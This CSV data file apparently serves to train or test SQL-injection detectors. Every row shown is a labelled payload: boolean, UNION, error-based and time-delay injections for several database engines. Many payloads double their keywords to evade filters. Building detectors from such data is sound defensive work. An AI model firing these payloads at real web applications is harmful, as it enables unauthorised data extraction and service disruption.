Query,Label
1'  )   rllikeike   (  sselectelect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd   (  'ejnt' llikeike 'ejnt,1
 (  selecselectt   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  selecselectt 1570 ffromrom mysql.db  )   end   )    ) ,1
1   )    )    as fpej whwhereere 6790  =  6790 anandd   (  3020  =  3020  )  *6703--,1
"1%"" oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1%"" uniunionon all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
1' aandnd   (  5116  =  1602  )  *1602,1
1'||  (  seleselectct 'rjiiss' frfromom dual whwhereere 7696  =  7696 anandd 3754  =    (  seleselectct upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual   )    )   ||',1
"1'  )   aandnd elt  (  4249  =  4249,7259  )   aandnd   (  'bxnn'  =  'bxnn",1
"-1585%""   )    )    uniunionon all seselectlect 8818,8818,8818,8818,8818,8818#",1
"iif  (  1718  =  5436,1,1/0  )  ",1
"-1332  )   as qtbb whewherere 7261  =  7261 oorr 1 group bbyy concat  (  0x7171706a71,  (  selecselectt   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"1 oorr 1022  =    (  selselectect count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
-8615   )    )     )   oorr 4039  =  9144,1
1   )    )    as beld wwherehere 1679  =  1679 oorr sleep  (  5  )  #,1
1  )   anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
"1  )   anandd 8514  =    (  seleselectct count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )  ",1
"1'   )    )     )   oorr 9643  =    (  sselectelect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3  )   aandnd    (    (     (  'phdn' lilikeke 'phdn",1
"1   )    )     )   ununionion all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1%'  )   anandd exp  (  ~  (  sselectelect * frofromm   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd   (  '%'  =  '",1
"-4983%""  )   oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  ""%""  =  """,1
"1%"" uniunionon all selselectect nunullll,nunullll--",1
"1'+  (  seleselectct 'swxi' whwhereere 7651  =  7651 anandd 6414  =    (  seleselectct count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
"1%' oorr 8156  =    (  selselectect count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
-6145 oorr   (  8459  =  8459  )  *4906-- yklv,1
-6178   )    )    as lygb whwhereere 9559  =  9559 oorr   (  8459  =  8459  )  *4906--,1
"1""  )   as ikdo whwhereere 4128  =  4128",1
1  )   whewherere 6150  =  6150,1
1'  )   oorr 4240  =    (  sselectelect 4240 frfromom pg_sleep  (  5   )    )   --,1
1  )   aandnd 8594  =    (  seleselectct 8594 frofromm pg_sleep  (  5   )    )   --,1
1' whewherere 6409  =  6409,1
"-4346'  )   oorr 1 group bbyy concat  (  0x7171706a71,  (  selecselectt   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
1 wherwheree 4003  =  4003 uniunionon all selecselectt nulnulll--,1
"1""  )   aandnd 8148  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
1  )   whewherere 1929  =  1929 aandnd   (  seselectlect * frofromm   (  seselectlect  (  sleep  (  5   )    )     )  fzno  )  --,1
"seleselectct dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frofromm dual anandd    (    (     (  'knbx' lilikeke 'knbx",1
"1  )   as cfnz whewherere 6065  =  6065 uniounionn all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1   )    )    as henn whewherere 9980  =  9980 oorr 4915  =    (  seselectlect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"1'  )   whewherere 3375  =  3375 oorr 8315  =    (  seleselectct count  (  *  )   ffromrom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )  --",1
"1'||  (  selselectect 'akye' whwhereere 9242  =  9242 uniunionon all selselectect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"1"" whwhereere 2235  =  2235 uniunionon all selecselectt nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"1""   )    )    oorr   (  seselectlect 9173 frfromom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd    (    (   ""tfso""  =  ""tfso",1
-6086'   )    )    oorr   (  6719  =  7280  )  *7280 anandd    (    (   'ozbj'  =  'ozbj,1
"1 wherwheree 2146  =  2146 oorr 8384  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"1 anandd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   # qmkh",1
1%'   )    )    aandnd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selecselectt   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (   '%'  =  ',1
"1  )   as kjsd wherwheree 1670  =  1670 oorr 1022  =    (  sselectelect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-2987""  )   as iyob whwhereere 7827  =  7827 oorr   (  8459  =  8459  )  *4906--",1
"-6368   )    )    uniounionn all seselectlect 4646,4646,4646,4646,4646,4646,4646--",1
-6947'   )    )    as qqjp wwherehere 6700  =  6700 uniounionn all seselectlect 6700#,1
-2604   )    )    as sekb whewherere 6897  =  6897 oorr 1000  =  7683,1
"1"" uniounionn all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
1'   )    )     )   rliklikee   (  selselectect   (  case when   (  4076  =  4881  )   then 1 else 0x28 end   )    )    aandnd    (    (     (  'grzs'  =  'grzs,1
-2751 wherwheree 6334  =  6334 oorr   (  9668  =  5845  )  *5845--,1
1'+  (  seleselectct 'rejz' whewherere 1530  =  1530 anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1
1'   )    )    as jbcd whewherere 9078  =  9078 aandnd 6969  =    (  seleselectct 6969 frofromm pg_sleep  (  5   )    )   --,1
"1  )   anandd updupdateatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
"selecselectt count  (  *  )   frfromom generate_series  (  1,5000000  )   anandd   (  'qpdu'  =  'qpdu",1
"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   aandnd   (  '%'  =  '",1
-3246%' uunionnion all sselectelect 4012#,1
"1""   )    )     (  selecselectt   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frfromom iinnfoorrmation_schema.system_users  )   aandnd    (    (   ""rfam"" lilikeke ""rfam",1
"1'+  (  sselectelect dnxi wherwheree 5850  =  5850 oorr 8156  =    (  sselectelect count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
-6353%'   )    )    oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (   '%'  =  ',1
"1'+  (  seleselectct 'tyuz' whwhereere 3957  =  3957 oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull   )    )   +'",1
"1"" whwhereere 9461  =  9461",1
"-9163"" ununionion all seselectlect 3820,3820,3820,3820,3820,3820,3820,3820,3820#",1
"1'   )    )    aandnd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   'qgdv'  =  'qgdv",1
"sselectelect count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +'",1
1'   )    )    as txxn wwherehere 7884  =  7884 anandd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
1 whewherere 6173  =  6173,1
"1 whewherere 6383  =  6383 oorr elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1%"" aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nunullll  )   aandnd ""%""  =  """,1
"1' wwherehere 7504  =  7504 anandd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
sselectelect   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  sselectelect 0  )   end  )  --,1
"1'  )   oorr 5286  =    (  selecselectt count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd   (  'cqrp'  =  'cqrp",1
"1""  )   as eomu wherwheree 6599  =  6599",1
1'+  (  seleselectct 'wyed' whwhereere 9896  =  9896,1
"1'+  (  seselectlect oogh wwherehere 1167  =  1167 oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-8982'+  (  seleselectct anyd wwherehere 5358  =  5358 ununionion all seleselectct 5358,5358,5358,5358,5358,5358#",1
"1'+  (  selselectect jrmz whewherere 4762  =  4762 anandd elt  (  9588  =  9794,9794   )    )   +'",1
"1""   )    )    uunionnion all seleselectct nulnulll#",1
"-2263'  )   whwhereere 7931  =  7931 uniounionn all seselectlect 7931,7931,7931--",1
-5585%'   )    )     )   oorr 6990  =  7727,1
-2300  )   oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
"1""   )    )     )   aandnd 3754  =    (  selecselectt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )   aandnd    (    (     (  ""wwaq""  =  ""wwaq",1
"1'   )    )     )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (     (  'swua' llikeike 'swua",1
"1%""   )    )    oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
end aandnd 'wdce'  =  'wdce,1
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   aandnd    (    (   'beoh'  =  'beoh",1
"-5998""  )   as gazd wwherehere 2814  =  2814 ununionion all seselectlect 2814,2814,2814,2814,2814,2814,2814--",1
"1 whewherere 2278  =  2278 anandd   (  sselectelect 9067 frofromm  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )  --",1
1' aandnd sleep  (  5  )  #,1
1%'   )    )    anandd 7160  =  7249--,1
"1   )    )     )    (  sselectelect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   ffromrom   (  vvaluesalues  (  0   )    )     )   anandd    (    (     (  3950  =  3950",1
"1""   )    )    uniunionon all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
1'   )    )    as zbkp wwherehere 1720  =  1720 aandnd 4110  =  6748#,1
1   )    )    as smtf whewherere 5829  =  5829,1
"-2460%""  )   oorr   (  2660  =  5767  )  *5767 aandnd   (  ""%""  =  """,1
1'   )    )    as myws wwherehere 5274  =  5274,1
"  (  sselectelect * frfromom   (  sselectelect  (  sleep  (  5   )    )     )  srmq  )   anandd    (    (   ""%""  =  """,1
"-5702'   )    )     )   uniunionon all seleselectct 7806,7806,7806,7806,7806--",1
"1%'  )   oorr 5356  =    (  selselectect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   whwhereere 3255  =  3255 oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1""   )    )    as pafp wwherehere 6770  =  6770 anandd 8148  =  llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"-9896""   )    )     )   uunionnion all seleselectct 4073,4073,4073,4073,4073#",1
"1  )   oorr 8315  =    (  sselectelect count  (  *  )   ffromrom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   aandnd   (  7338  =  7338",1
1'+  (  selecselectt 'yahd' whewherere 5850  =  5850,1
-8636'   )    )     )   oorr 4301  =  7212--,1
"1   )    )    anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (   6659  =  6659",1
seselectlect sleep  (  5  )   aandnd    (    (     (  'etzb'  =  'etzb,1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd    (    (     (  ""bqfj"" lilikeke ""bqfj",1
seleselectct   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  seleselectct 3414 frfromom iinnfoorrmation_schema.character_sesetts  )   end  )  #,1
"1"" whwhereere 9669  =  9669",1
"1%'   )    )    oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
1%'   )    )     )   aandnd   (  selselectect * frofromm   (  selselectect  (  sleep  (  5   )    )     )  fzno  )   aandnd    (    (     (  '%'  =  ',1
-1796'  )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd   (  'lpuw' lilikeke 'lpuw,1
-7246'||  (  seselectlect 'qchp' frfromom dual wwherehere 8317  =  8317 ooorrderrder bbyy 1--,1
"1' oorr 1022  =    (  seleselectct count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-5529"" oorr 5903  =    (  'qqpjq'||  (  seleselectct case 5903 when 5903 then 1 else 0 end frfromom rdb$ddatabaseatabase  )  ||'qzvzq'  )  ",1
"1'  )   aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    aandnd   (  'mhvy' llikeike 'mhvy",1
"1'  )   anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
1   )    )    as gocb whwhereere 4335  =  4335,1
"1%'  )   anandd 8635  =    (  seleselectct count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
"1""   )    )    oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"selecselectt count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3 anandd   (  'yvbb'  =  'yvbb",1
"1"" aandnd 7533  =  7533",1
"1  )   uniunionon all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1'   )    )     )    (  seleselectct   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  valvaluesues  (  0   )    )     )   anandd    (    (     (  'weof'  =  'weof",1
1'+  (  seleselectct 'uetb' wherwheree 6468  =  6468,1
"1'+  (  seselectlect lhho whwhereere 7579  =  7579 anandd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
"1 wherwheree 1886  =  1886 uniunionon all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"-1844"" whewherere 7948  =  7948 oorr 1570  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""   )    )    anandd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
"seselectlect count  (  *  )   frfromom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3 aandnd    (    (   'btnl'  =  'btnl",1
"1'||  (  selecselectt 'tdcr' whewherere 6792  =  6792 uunionnion all selecselectt nnullull,nnullull,nnullull,nnullull,nnullull#",1
"1""  )   whwhereere 6859  =  6859 uunionnion all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"-9098'||  (  seleselectct 'xodn' frfromom dual wwherehere 8202  =  8202 uniunionon all seleselectct 8202,8202,8202,8202,8202,8202,8202--",1
"selecselectt * frofromm generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   lilimitmit 1--",1
"1"" oorr 8315  =    (  sselectelect count  (  *  )   ffromrom sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  ",1
seleselectct sleep  (  5  )   aandnd    (    (     (  'thqr' lilikeke 'thqr,1
"1 aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
"1   )    )     )   uunionnion all selecselectt nunullll,nunullll,nunullll,nunullll--",1
"-9565"" wherwheree 1616  =  1616 uunionnion all selselectect 1616,1616,1616,1616--",1
"1""  )   ununionion all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1%"" aandnd 3707  =    (  selecselectt count  (  *  )   ffromrom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   aandnd ""%""  =  """,1
"1"" aandnd   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  fzno  )   aandnd ""gddl"" lilikeke ""gddl",1
"1%' aandnd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1  )   as fgqe wwherehere 1526  =  1526 anandd   (  seleselectct 2*  (  if   (    (   seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1'   )    )     )   aandnd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    aandnd    (    (     (  'wesl'  =  'wesl",1
"1'   )    )     )   oorr 7552  =    (  selselectect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   anandd    (    (     (  'bfrq' liklikee 'bfrq",1
-6802  )   as coyv whwhereere 5693  =  5693 oorr 8571  =  8571--,1
"-3817""  )   as vugz wherwheree 3064  =  3064 oorr 9323  =  9323#",1
 (  sselectelect * ffromrom   (  sselectelect  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,1
"selselectect llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   ",1
"1%""  )   aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""  )   anandd sleep  (  5  )   anandd   (  ""fsuf"" lilikeke ""fsuf",1
"1""   )    )     (  selselectect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  vavalueslues  (  0   )    )     )   anandd    (    (   ""prhp""  =  ""prhp",1
"1 whewherere 9279  =  9279 oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
1%'   )    )    anandd 3721  =  2597#,1
"seleselectct count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd    (    (     (  ""woun"" lilikeke ""woun",1
"1""   )    )    as yfpl whwhereere 4820  =  4820 uniunionon all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
1' aandnd 6969  =    (  seleselectct 6969 frfromom pg_sleep  (  5   )    ) ,1
-9581  )   as jkqo wherwheree 5200  =  5200 oorr 6872  =  6872--,1
 (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  srmq  )   anandd    (    (     (  3124  =  3124,1
"1""   )    )    as wfne wherwheree 8933  =  8933",1
-7633'  )   as aslj whwhereere 2317  =  2317 oorr 8571  =  8571--,1
"1  )   as ezje whwhereere 5234  =  5234 anandd make_sesett  (  8403  =  8403,8899  )  --",1
"1'   )    )    oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd    (    (   'wgpg' liklikee 'wgpg",1
1'  )   anandd   (  2763  =  4004  )  *4004 anandd   (  'dtts'  =  'dtts,1
"1""  )   as nyui wwherehere 2511  =  2511",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   aandnd   (  'qdhz'  =  'qdhz",1
"1'+  (  seleselectct 'arqt' wwherehere 2336  =  2336 oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
"-1401""   )    )    ununionion all selecselectt 3480,3480,3480,3480,3480,3480--",1
end aandnd    (    (     (  'ycte'  =  'ycte,1
"1""   )    )    oorr row  (  1045,7562  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm   (  seselectlect 8488 uunionnion seselectlect 5584 uunionnion seselectlect 3051 uunionnion seselectlect 1210  )  a group bbyy x  )   anandd    (    (   ""cyyh""  =  ""cyyh",1
" seselectlect sleep  (  5  )   anandd    (    (     (  ""uvzc"" lilikeke ""uvzc",1
